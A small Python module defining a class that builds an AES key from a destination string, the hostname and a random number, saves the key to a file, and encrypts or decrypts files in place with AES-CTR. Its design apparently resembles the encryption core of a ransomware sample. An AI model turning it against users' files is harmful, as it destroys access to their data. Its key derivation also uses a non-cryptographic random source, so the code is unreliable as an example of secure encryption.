import hashlib, random, socket, os
from Crypto.Util import Counter
from Crypto.Cipher import AES

class CryptoManager:
    def __init__(self, destination):
        self.key = self.generate_key(destination)
        self.save_key_to_file()

    def generate_key(self, destination):
        hash_input = destination + socket.gethostname() + str(random.randint(0, 100000000000000000))
        hash_input = hash_input.encode('utf-8')
        key = hashlib.sha512(hash_input).hexdigest()[:32]
        return key

    def save_key_to_file(self):
        key_file_path = os.path.join(os.path.dirname(__file__),'..','key')  # Ruta al archivo "key" en el directorio raíz
        with open(key_file_path, 'w') as key_file:
            key_file.write(self.key)  # Guarda la clave en el archivo

    def encrypt_decrypt(self, file_path, crypto, block_size=16):
        with open(file_path, 'r+b') as file:
            unencrypted_content = file.read(block_size)
            while unencrypted_content:
                encrypted_content = crypto(unencrypted_content)
                file.seek(- len(unencrypted_content), 1)
                file.write(encrypted_content)
                unencrypted_content = file.read(block_size)

    def encrypt(self, file_path):
        counter = Counter.new(128)
        crypto = AES.new(self.key.encode('utf-8'), AES.MODE_CTR, counter=counter)
        self.encrypt_decrypt(file_path, crypto.encrypt)

    def decrypt(self, file_path, key):
        counter = Counter.new(128)
        crypto = AES.new(key.encode('utf-8'), AES.MODE_CTR, counter=counter)
        self.encrypt_decrypt(file_path, crypto.decrypt)
